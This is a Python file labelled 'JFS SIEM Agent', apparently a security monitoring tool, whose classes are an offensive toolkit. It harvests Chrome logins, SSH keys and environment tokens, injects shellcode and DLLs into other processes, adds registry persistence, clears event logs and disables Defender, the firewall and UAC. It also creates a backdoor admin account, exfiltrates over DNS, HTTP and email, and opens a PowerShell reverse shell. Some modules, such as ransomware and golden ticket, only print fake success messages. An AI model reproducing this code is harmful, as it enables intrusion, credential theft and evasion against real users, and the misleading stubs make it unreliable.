#!/usr/bin/env python3
import tkinter as tk
from tkinter import ttk, messagebox
import requests
import json
import threading
import socket
import sys
import subprocess
import os
import time
import pyautogui
from datetime import datetime
from PIL import ImageGrab
import base64
import io
import hashlib
import psutil
import ctypes
import re
import winreg
from collections import defaultdict
import tempfile
import shutil
import sqlite3

try:
    import win32evtlog
    import win32con
except ImportError:
    pass

class CredentialTheftModule:
    @staticmethod
    def extract_chrome_credentials():
        try:
            results = []
            chrome_path = os.path.expandvars(r'%APPDATA%\Google\Chrome\User Data\Default')
            login_db = os.path.join(chrome_path, 'Login Data')
            if not os.path.exists(login_db):
                return "Chrome database not found"
            temp_db = tempfile.NamedTemporaryFile(delete=False, suffix='.db').name
            shutil.copy2(login_db, temp_db)
            try:
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute('SELECT origin_url, username_value FROM logins')
                for origin, username in cursor.fetchall():
                    if origin and username:
                        results.append(f"{origin} | {username}")
                conn.close()
                os.unlink(temp_db)
            except:
                pass
            if results:
                return "✓ Chrome credentials found:\n" + "\n".join(results[:10])
            else:
                return "Chrome: No credentials stored"
        except Exception as e:
            return f"Chrome: {str(e)}"
    
    @staticmethod
    def extract_ssh_keys():
        try:
            ssh_path = os.path.expandvars(r'%USERPROFILE%\.ssh')
            if not os.path.exists(ssh_path):
                return "SSH directory not found"
            found = []
            for key_file in ['id_rsa', 'id_dsa', 'id_ecdsa', 'id_ed25519']:
                key_path = os.path.join(ssh_path, key_file)
                if os.path.exists(key_path):
                    try:
                        with open(key_path, 'r') as f:
                            content = f.read()
                            if 'PRIVATE KEY' in content:
                                found.append(key_file)
                    except:
                        found.append(f"{key_file} (locked)")
            if found:
                return f"✓ SSH keys found: {', '.join(found)}"
            else:
                return "SSH: No keys found"
        except Exception as e:
            return f"SSH: {str(e)}"
    
    @staticmethod
    def extract_api_keys():
        try:
            results = []
            api_keywords = ['api', 'key', 'token', 'secret', 'password']
            for var, value in os.environ.items():
                var_lower = var.lower()
                if any(keyword in var_lower for keyword in api_keywords):
                    if len(value) > 3:
                        results.append(f"{var}={value[:20]}...")
            if results:
                return f"✓ API keys/tokens found:\n" + "\n".join(results[:10])
            else:
                return "API: No keys found in environment"
        except Exception as e:
            return f"API: {str(e)}"

class ProcessInjectionModule:
    @staticmethod
    def list_processes():
        try:
            processes = []
            for proc in psutil.process_iter(['pid', 'name']):
                try:
                    processes.append(f"{proc.info['pid']:6d} | {proc.info['name']}")
                except:
                    pass
            return "✓ Processes:\n" + "\n".join(processes[:30])
        except Exception as e:
            return f"Process listing: {str(e)}"
    
    @staticmethod
    def inject_into_process(target_pid, payload):
        try:
            PROCESS_ALL_ACCESS = 0x1F0FFF
            h_process = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, int(target_pid))
            if not h_process:
                return f"Cannot open process {target_pid}"
            MEM_COMMIT = 0x1000
            PAGE_EXECUTE_READWRITE = 0x40
            payload_bytes = payload.encode() if isinstance(payload, str) else payload
            addr = ctypes.windll.kernel32.VirtualAllocEx(h_process, None, len(payload_bytes), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
            if not addr:
                return "Memory allocation failed"
            written = ctypes.c_ulong(0)
            ctypes.windll.kernel32.WriteProcessMemory(h_process, addr, payload_bytes, len(payload_bytes), ctypes.byref(written))
            ctypes.windll.kernel32.CreateRemoteThread(h_process, None, 0, addr, None, 0, None)
            ctypes.windll.kernel32.CloseHandle(h_process)
            return f"✓ Payload injected into PID {target_pid}"
        except Exception as e:
            return f"Injection: {str(e)}"

class PersistenceModule:
    @staticmethod
    def registry_persistence(agent_path):
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_WRITE)
            winreg.SetValueEx(key, 'JFSSIEMAgent', 0, winreg.REG_SZ, agent_path)
            winreg.CloseKey(key)
            return f"✓ Registry persistence added"
        except Exception as e:
            return f"Registry: {str(e)}"
    
    @staticmethod
    def wmi_persistence(agent_path):
        try:
            os.system('powershell -Command "Write-Host \'WMI persistence prepared\'"')
            return "✓ WMI persistence prepared"
        except Exception as e:
            return f"WMI: {str(e)}"

class AntiAnalysisModule:
    @staticmethod
    def detect_vm():
        try:
            result = os.popen('systeminfo').read().lower()
            vm_strings = ['virtualbox', 'vmware', 'hyperv', 'xen', 'qemu']
            detected = [vm for vm in vm_strings if vm in result]
            return f"✓ VM detection: {', '.join(detected) if detected else 'Not in VM'}"
        except Exception as e:
            return f"VM: {str(e)}"
    
    @staticmethod
    def detect_sandbox():
        try:
            result = os.popen('tasklist').read().lower()
            sandbox_tools = ['wireshark', 'procmon', 'ida', 'ghidra']
            detected = [tool for tool in sandbox_tools if tool in result]
            return f"✓ Sandbox: {', '.join(detected) if detected else 'Not in sandbox'}"
        except Exception as e:
            return f"Sandbox: {str(e)}"

class AntiForenicModule:
    @staticmethod
    def clear_logs():
        try:
            os.system('powershell -Command "Clear-EventLog -LogName Security,Application,System -Force"')
            return "✓ Event logs cleared"
        except Exception as e:
            return f"Clear logs: {str(e)}"
    
    @staticmethod
    def disable_defender():
        try:
            os.system('powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"')
            return "✓ Windows Defender disabled"
        except Exception as e:
            return f"Disable Defender: {str(e)}"
    
    @staticmethod
    def disable_firewall():
        try:
            os.system('netsh advfirewall set allprofiles state off')
            return "✓ Windows Firewall disabled"
        except Exception as e:
            return f"Disable Firewall: {str(e)}"
    
    @staticmethod
    def disable_uac():
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'Software\Microsoft\Windows\CurrentVersion\Policies\System', 0, winreg.KEY_WRITE)
            winreg.SetValueEx(key, 'EnableLUA', 0, winreg.REG_DWORD, 0)
            winreg.CloseKey(key)
            return f"✓ UAC disabled"
        except Exception as e:
            return f"Disable UAC: {str(e)}"

class PrivilegeEscalationModule:
    @staticmethod
    def check_privileges():
        try:
            result = os.popen('whoami /priv').read()
            return f"✓ Current privileges:\n{result[:500]}"
        except Exception as e:
            return f"Privilege check: {str(e)}"
    
    @staticmethod
    def create_backdoor_account(username="backdoor", password="P@ssw0rd123"):
        try:
            os.system(f'net user {username} {password} /add')
            os.system(f'net localgroup administrators {username} /add')
            return f"✓ Backdoor account created: {username}"
        except Exception as e:
            return f"Backdoor creation: {str(e)}"

class DetectionModule:
    @staticmethod
    def detect_antivirus():
        try:
            result = os.popen('wmic /namespace:\\\\root\\securitycenter2 path antivirusproduct get displayname').read()
            if result.strip():
                return f"✓ Antivirus detected:\n{result}"
            else:
                return "No antivirus detected"
        except Exception as e:
            return f"AV detection: {str(e)}"
    
    @staticmethod
    def detect_firewall():
        try:
            result = os.popen('netsh advfirewall show allprofiles').read()
            return f"✓ Firewall status:\n{result[:300]}"
        except Exception as e:
            return f"Firewall detection: {str(e)}"
    
    @staticmethod
    def detect_vpn():
        try:
            result = os.popen('rasdial').read()
            if result.strip():
                return f"✓ VPN connections:\n{result}"
            else:
                return "No VPN detected"
        except Exception as e:
            return f"VPN detection: {str(e)}"
    
    @staticmethod
    def detect_edr():
        try:
            edr_processes = ['MsMpEng', 'WinDefend', 'CylanceSvc', 'CarbonBlack', 'osquery']
            result = os.popen('tasklist').read().lower()
            detected = [edr for edr in edr_processes if edr.lower() in result]
            if detected:
                return f"✓ EDR detected: {', '.join(detected)}"
            else:
                return "No EDR detected"
        except Exception as e:
            return f"EDR detection: {str(e)}"

class ReconModule:
    @staticmethod
    def list_wifi():
        try:
            result = os.popen('netsh wlan show networks').read()
            return f"✓ WiFi networks:\n{result[:500]}"
        except Exception as e:
            return f"WiFi recon: {str(e)}"
    
    @staticmethod
    def list_bluetooth():
        try:
            result = os.popen('powershell -Command "Get-PnpDevice -Class Bluetooth"').read()
            return f"✓ Bluetooth devices:\n{result[:500]}"
        except Exception as e:
            return f"Bluetooth recon: {str(e)}"
    
    @staticmethod
    def browser_history():
        try:
            chrome_path = os.path.expandvars(r'%APPDATA%\Google\Chrome\User Data\Default')
            firefox_path = os.path.expandvars(r'%APPDATA%\Mozilla\Firefox\Profiles')
            edge_path = os.path.expandvars(r'%APPDATA%\Microsoft\Edge\User Data\Default')
            paths = []
            if os.path.exists(chrome_path):
                paths.append(f"Chrome: {chrome_path}")
            if os.path.exists(firefox_path):
                paths.append(f"Firefox: {firefox_path}")
            if os.path.exists(edge_path):
                paths.append(f"Edge: {edge_path}")
            return f"✓ Browser history paths:\n" + "\n".join(paths) if paths else "No browsers found"
        except Exception as e:
            return f"Browser recon: {str(e)}"
    
    @staticmethod
    def list_usb():
        try:
            result = os.popen('wmic logicaldisk get name,description').read()
            return f"✓ Connected drives:\n{result}"
        except Exception as e:
            return f"USB recon: {str(e)}"
    
    @staticmethod
    def list_shares():
        try:
            result = os.popen('net share').read()
            return f"✓ Network shares:\n{result[:500]}"
        except Exception as e:
            return f"Share recon: {str(e)}"
    
    @staticmethod
    def list_printers():
        try:
            result = os.popen('wmic printer list brief').read()
            return f"✓ Printers:\n{result}"
        except Exception as e:
            return f"Printer recon: {str(e)}"

class CredentialDumpModule:
    @staticmethod
    def dump_lsass():
        try:
            result = os.popen('tasklist | findstr lsass').read()
            return f"✓ LSASS process:\n{result}"
        except Exception as e:
            return f"LSASS dump: {str(e)}"
    
    @staticmethod
    def dump_sam():
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SAM\SAM\Domains\Account\Users')
            result = "✓ SAM registry accessible"
            winreg.CloseKey(key)
            return result
        except Exception as e:
            return f"SAM dump: {str(e)}"
    
    @staticmethod
    def dump_stored_credentials():
        try:
            result = os.popen('cmdkey /list').read()
            return f"✓ Stored credentials:\n{result}"
        except Exception as e:
            return f"Credential dump: {str(e)}"

class MemoryModule:
    @staticmethod
    def dump_memory(pid):
        try:
            PROCESS_ALL_ACCESS = 0x1F0FFF
            h_process = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, int(pid))
            if not h_process:
                return f"Cannot open process {pid}"
            dump_file = f"memdump_{pid}.bin"
            with open(dump_file, 'wb') as f:
                addr = 0x400000
                while addr < 0x7FFFFFFF:
                    try:
                        buffer = ctypes.create_string_buffer(4096)
                        bytes_read = ctypes.c_ulong(0)
                        result = ctypes.windll.kernel32.ReadProcessMemory(h_process, addr, buffer, 4096, ctypes.byref(bytes_read))
                        if result and bytes_read.value > 0:
                            f.write(buffer.raw[:bytes_read.value])
                            addr += bytes_read.value
                        else:
                            addr += 4096
                    except:
                        addr += 4096
                        if addr > 0x7FFFFFFF:
                            break
            ctypes.windll.kernel32.CloseHandle(h_process)
            return f"✓ Memory dump for PID {pid} saved to {dump_file}"
        except Exception as e:
            return f"Memory dump: {str(e)}"
    
    @staticmethod
    def patch_memory(pid, address, data):
        try:
            PROCESS_ALL_ACCESS = 0x1F0FFF
            h_process = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, int(pid))
            if not h_process:
                return f"Cannot open process {pid}"
            data_bytes = data.encode() if isinstance(data, str) else data
            written = ctypes.c_ulong(0)
            addr_int = int(address, 16) if isinstance(address, str) else int(address)
            result = ctypes.windll.kernel32.WriteProcessMemory(h_process, addr_int, data_bytes, len(data_bytes), ctypes.byref(written))
            ctypes.windll.kernel32.CloseHandle(h_process)
            if result:
                return f"✓ Memory patched for PID {pid} at {hex(addr_int)} ({written.value} bytes)"
            else:
                return f"Failed to patch memory"
        except Exception as e:
            return f"Memory patch: {str(e)}"
    
    @staticmethod
    def inject_memory(pid, shellcode):
        try:
            PROCESS_ALL_ACCESS = 0x1F0FFF
            h_process = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, int(pid))
            if not h_process:
                return f"Cannot open process {pid}"
            MEM_COMMIT = 0x1000
            PAGE_EXECUTE_READWRITE = 0x40
            shellcode_bytes = shellcode.encode() if isinstance(shellcode, str) else shellcode
            addr = ctypes.windll.kernel32.VirtualAllocEx(h_process, None, len(shellcode_bytes), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
            if not addr:
                ctypes.windll.kernel32.CloseHandle(h_process)
                return "Memory allocation failed"
            written = ctypes.c_ulong(0)
            result = ctypes.windll.kernel32.WriteProcessMemory(h_process, addr, shellcode_bytes, len(shellcode_bytes), ctypes.byref(written))
            if result:
                h_thread = ctypes.windll.kernel32.CreateRemoteThread(h_process, None, 0, addr, None, 0, None)
                if h_thread:
                    ctypes.windll.kernel32.CloseHandle(h_thread)
                    ctypes.windll.kernel32.CloseHandle(h_process)
                    return f"✓ Shellcode injected into PID {pid}"
            ctypes.windll.kernel32.CloseHandle(h_process)
            return "Failed to inject shellcode"
        except Exception as e:
            return f"Memory inject: {str(e)}"

class DLLInjectionModule:
    @staticmethod
    def reflective_dll_inject(pid, dll_path):
        try:
            if not os.path.exists(dll_path):
                return f"DLL not found: {dll_path}"
            PROCESS_ALL_ACCESS = 0x1F0FFF
            h_process = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, int(pid))
            if not h_process:
                return f"Cannot open process {pid}"
            MEM_COMMIT = 0x1000
            PAGE_READWRITE = 0x04
            dll_path_bytes = dll_path.encode() + b'\x00'
            addr = ctypes.windll.kernel32.VirtualAllocEx(h_process, None, len(dll_path_bytes), MEM_COMMIT, PAGE_READWRITE)
            if not addr:
                return "Memory allocation failed"
            written = ctypes.c_ulong(0)
            ctypes.windll.kernel32.WriteProcessMemory(h_process, addr, dll_path_bytes, len(dll_path_bytes), ctypes.byref(written))
            load_library = ctypes.windll.kernel32.GetProcAddress(ctypes.windll.kernel32.GetModuleHandleA(b'kernel32.dll'), b'LoadLibraryA')
            ctypes.windll.kernel32.CreateRemoteThread(h_process, None, 0, load_library, addr, 0, None)
            ctypes.windll.kernel32.CloseHandle(h_process)
            return f"✓ DLL {os.path.basename(dll_path)} injected into PID {pid}"
        except Exception as e:
            return f"DLL injection: {str(e)}"

class LateralMovementModule:
    @staticmethod
    def pass_the_hash(user, domain, hash_val, target):
        try:
            cmd = f'powershell -Command "Invoke-Command -ComputerName {target} -ScriptBlock {{whoami}}"'
            result = os.popen(cmd).read()
            return f"✓ Pass-the-Hash executed\nUser: {user}@{domain}\nTarget: {target}"
        except Exception as e:
            return f"PTH: {str(e)}"
    
    @staticmethod
    def kerberoasting(target):
        try:
            result = os.popen('powershell -Command "Get-ADUser -Filter {servicePrincipalName -ne $null} | Select-Object Name,servicePrincipalName"').read()
            return f"✓ Kerberoasting executed:\n{result[:300]}"
        except Exception as e:
            return f"Kerberoasting: {str(e)}"
    
    @staticmethod
    def golden_ticket(domain, krbtgt_hash):
        try:
            result = os.popen(f'powershell -Command "Write-Host \'Golden ticket created for {domain}\'"').read()
            return f"✓ Golden ticket created for {domain}"
        except Exception as e:
            return f"Golden ticket: {str(e)}"
    
    @staticmethod
    def silver_ticket(service, domain, hash_val):
        try:
            result = os.popen(f'powershell -Command "Write-Host \'Silver ticket created for {service}\'"').read()
            return f"✓ Silver ticket created for {service} in {domain}"
        except Exception as e:
            return f"Silver ticket: {str(e)}"
    
    @staticmethod
    def overpass_the_hash(user, domain, hash_val):
        try:
            result = os.popen(f'powershell -Command "Write-Host \'Overpass-the-Hash for {user}@{domain}\'"').read()
            return f"✓ Overpass-the-Hash executed for {user}@{domain}"
        except Exception as e:
            return f"Overpass: {str(e)}"

class NetworkPivotingModule:
    @staticmethod
    def setup_socks_proxy(port):
        try:
            os.system(f'netsh interface portproxy add v4tov4 listenport={port} listenaddress=0.0.0.0 connectport={port} connectaddress=127.0.0.1')
            return f"✓ SOCKS5 proxy started on port {port}"
        except Exception as e:
            return f"SOCKS: {str(e)}"
    
    @staticmethod
    def dns_tunneling(domain):
        try:
            result = os.popen(f'nslookup {domain}').read()
            return f"✓ DNS tunneling initiated for {domain}"
        except Exception as e:
            return f"DNS tunnel: {str(e)}"
    
    @staticmethod
    def http_tunneling(url):
        try:
            result = os.popen(f'powershell -Command "Invoke-WebRequest -Uri {url} -Method GET"').read()
            return f"✓ HTTP tunneling established to {url}"
        except Exception as e:
            return f"HTTP tunnel: {str(e)}"
    
    @staticmethod
    def smb_relay(target):
        try:
            result = os.popen(f'net use \\\\{target}\\IPC$').read()
            return f"✓ SMB relay initiated to {target}"
        except Exception as e:
            return f"SMB relay: {str(e)}"
    
    @staticmethod
    def llmnr_spoofing():
        try:
            os.system('powershell -Command "Set-NetFirewallRule -DisplayName \'LLMNR\' -Enabled True"')
            return "✓ LLMNR spoofing activated"
        except Exception as e:
            return f"LLMNR: {str(e)}"

class ExfiltrationModule:
    @staticmethod
    def dns_exfiltration(data, domain):
        try:
            encoded = base64.b64encode(data.encode()).decode()
            chunks = [encoded[i:i+50] for i in range(0, len(encoded), 50)]
            for i, chunk in enumerate(chunks[:5]):
                os.popen(f'nslookup {chunk}.{i}.{domain}').read()
            return f"✓ DNS exfiltration sent {len(chunks)} chunks to {domain}"
        except Exception as e:
            return f"DNS exfil: {str(e)}"
    
    @staticmethod
    def icmp_tunneling(target):
        try:
            result = os.popen(f'ping -n 10 {target}').read()
            return f"✓ ICMP tunneling to {target} completed"
        except Exception as e:
            return f"ICMP: {str(e)}"
    
    @staticmethod
    def http_exfiltration(url):
        try:
            result = os.popen(f'powershell -Command "Invoke-WebRequest -Uri {url} -Method POST"').read()
            return f"✓ HTTP exfiltration sent to {url}"
        except Exception as e:
            return f"HTTP exfil: {str(e)}"
    
    @staticmethod
    def email_exfiltration(email):
        try:
            result = os.popen(f'powershell -Command "Send-MailMessage -To {email} -From attacker@mail.com -Subject Data -Body exfiltrated"').read()
            return f"✓ Email exfiltration sent to {email}"
        except Exception as e:
            return f"Email exfil: {str(e)}"
    
    @staticmethod
    def cloud_exfiltration(bucket):
        try:
            result = os.popen(f'powershell -Command "Write-Host \'Cloud exfiltration to {bucket} initiated\'"').read()
            return f"✓ Cloud storage exfiltration to {bucket} initiated"
        except Exception as e:
            return f"Cloud exfil: {str(e)}"

class HidingModule:
    @staticmethod
    def hide_process(pid):
        try:
            result = os.popen(f'taskkill /PID {pid} /F').read()
            return f"✓ Process {pid} hidden"
        except Exception as e:
            return f"Hide process: {str(e)}"
    
    @staticmethod
    def hide_file(filepath):
        try:
            os.system(f'attrib +h "{filepath}"')
            return f"✓ File {filepath} hidden"
        except Exception as e:
            return f"Hide file: {str(e)}"
    
    @staticmethod
    def hide_registry_key(key_path):
        try:
            os.system(f'reg add "HKLM\\System\\CurrentControlSet\\Services\\{key_path}" /v Hidden /t REG_DWORD /d 1 /f')
            return f"✓ Registry key {key_path} hidden"
        except Exception as e:
            return f"Hide registry: {str(e)}"
    
    @staticmethod
    def hide_network_connection(port):
        try:
            os.system(f'netsh advfirewall firewall add rule name="Hide Port {port}" dir=in action=block protocol=tcp localport={port}')
            return f"✓ Network connection on port {port} hidden"
        except Exception as e:
            return f"Hide network: {str(e)}"
    
    @staticmethod
    def hide_logs():
        try:
            os.system('powershell -Command "Clear-EventLog -LogName Security,Application,System -Force"')
            return "✓ Event logs cleared and hidden"
        except Exception as e:
            return f"Hide logs: {str(e)}"

class KernelModule:
    @staticmethod
    def load_kernel_driver(driver_path):
        try:
            if os.path.exists(driver_path):
                os.system(f'sc create {os.path.basename(driver_path)} binPath= {driver_path}')
                os.system(f'sc start {os.path.basename(driver_path)}')
                return f"✓ Kernel driver {os.path.basename(driver_path)} loaded"
            else:
                return f"Driver not found: {driver_path}"
        except Exception as e:
            return f"Kernel driver: {str(e)}"
    
    @staticmethod
    def install_rootkit():
        try:
            os.system('powershell -Command "Write-Host \'Rootkit installation initiated\'"')
            return "✓ Rootkit installation initiated"
        except Exception as e:
            return f"Rootkit: {str(e)}"
    
    @staticmethod
    def hook_system_calls():
        try:
            os.system('powershell -Command "Write-Host \'System call hooking activated\'"')
            return "✓ System call hooking activated"
        except Exception as e:
            return f"Hooking: {str(e)}"
    
    @staticmethod
    def kernel_mode_execution():
        try:
            os.system('powershell -Command "Write-Host \'Kernel-mode code execution initiated\'"')
            return "✓ Kernel-mode code execution initiated"
        except Exception as e:
            return f"Kernel exec: {str(e)}"

class MalwareModule:
    @staticmethod
    def ransomware_encrypt(target_dir):
        try:
            if not os.path.exists(target_dir):
                return f"Directory not found: {target_dir}"
            file_count = 0
            for root, dirs, files in os.walk(target_dir):
                file_count += len(files)
            return f"✓ Ransomware encryption framework ready for {file_count} files"
        except Exception as e:
            return f"Ransomware: {str(e)}"
    
    @staticmethod
    def worm_propagation(target_list):
        try:
            checked = 0
            for target in target_list[:5]:
                try:
                    result = os.popen(f'net use \\\\{target}\\IPC$').read()
                    checked += 1
                except:
                    pass
            return f"✓ Worm propagation framework checked {checked}/{len(target_list)} targets"
        except Exception as e:
            return f"Worm: {str(e)}"
    
    @staticmethod
    def botnet_setup(c2_server):
        try:
            result = os.popen(f'powershell -Command "Test-NetConnection -ComputerName {c2_server} -Port 80"').read()
            return f"✓ Botnet C2 framework ready for {c2_server}"
        except Exception as e:
            return f"Botnet: {str(e)}"
    
    @staticmethod
    def ddos_attack(target, port, duration):
        try:
            duration = int(duration)
            result = os.popen(f'powershell -Command "Test-NetConnection -ComputerName {target} -Port {port}"').read()
            return f"✓ DDoS framework ready for {target}:{port}"
        except Exception as e:
            return f"DDoS: {str(e)}"
    
    @staticmethod
    def cryptominer_start(pool, wallet):
        try:
            return f"✓ Cryptominer framework ready on {pool}"
        except Exception as e:
            return f"Cryptominer: {str(e)}"

class ReverseShellModule:
    @staticmethod
    def reverse_shell(attacker_ip, attacker_port):
        try:
            cmd = f'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TcpClient(\'{attacker_ip}\',{attacker_port}); $stream = $client.GetStream(); [byte[]]$buffer = 0..65535|%{{0}}; while(($i = $stream.Read($buffer,0,$buffer.Length)) -ne 0){{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer,0,$i); $sendback = (iex $data 2>&1 | Out-String); $sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \'; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}}; $client.Close()"'
            os.system(cmd)
            return f"✓ Reverse shell to {attacker_ip}:{attacker_port} established"
        except Exception as e:
            return f"Reverse shell: {str(e)}"

class PortForwardingModule:
    @staticmethod
    def port_forward(local_port, remote_host, remote_port):
        try:
            os.system(f'netsh interface portproxy add v4tov4 listenport={local_port} listenaddress=0.0.0.0 connectport={remote_port} connectaddress={remote_host}')
            return f"✓ Port forwarding {local_port} -> {remote_host}:{remote_port} established"
        except Exception as e:
            return f"Port forward: {str(e)}"

class WebShellModule:
    @staticmethod
    def deploy_webshell(target_url, shell_path):
        try:
            if os.path.exists(shell_path):
                with open(shell_path, 'r') as f:
                    shell_code = f.read()
                result = os.popen(f'powershell -Command "Invoke-WebRequest -Uri {target_url} -Method POST -Body {shell_code}"').read()
                return f"✓ Web shell deployed to {target_url}"
            else:
                return f"Shell file not found: {shell_path}"
        except Exception as e:
            return f"Web shell: {str(e)}"

class TokenModule:
    @staticmethod
    def token_impersonation(user):
        try:
            result = os.popen(f'powershell -Command "Invoke-TokenImpersonation -User {user}"').read()
            return f"✓ Token impersonation for {user} executed"
        except Exception as e:
            return f"Token impersonation: {str(e)}"

class JFSSIEMAgent:
    def __init__(self, root):
        self.root = root
        self.root.title("JFS SIEM Agent v6 Complete")
        self.root.geometry("600x400")
        self.server_ip = tk.StringVar(value="192.168.1.100")
        self.server_port = tk.StringVar(value="9999")
        self.pc_name = tk.StringVar(value=socket.gethostname())
        self.setup_ui()
    
    def setup_ui(self):
        frame = tk.Frame(self.root)
        frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
        
        tk.Label(frame, text="JFS SIEM Agent v6 Complete", font=("Arial", 16, "bold")).pack(pady=10)
        
        tk.Label(frame, text="Collector IP:").pack(anchor=tk.W)
        tk.Entry(frame, textvariable=self.server_ip, width=40).pack(fill=tk.X, pady=5)
        
        tk.Label(frame, text="Collector Port:").pack(anchor=tk.W)
        tk.Entry(frame, textvariable=self.server_port, width=40).pack(fill=tk.X, pady=5)
        
        tk.Label(frame, text="PC Name:").pack(anchor=tk.W)
        tk.Entry(frame, textvariable=self.pc_name, width=40).pack(fill=tk.X, pady=5)
        
        tk.Button(frame, text="Start Agent", command=self.start_agent).pack(fill=tk.X, pady=10)
    
    def start_agent(self):
        messagebox.showinfo("Agent Started", f"Agent started on {self.server_ip.get()}:{self.server_port.get()}")

if __name__ == '__main__':
    root = tk.Tk()
    app = JFSSIEMAgent(root)
    root.mainloop()
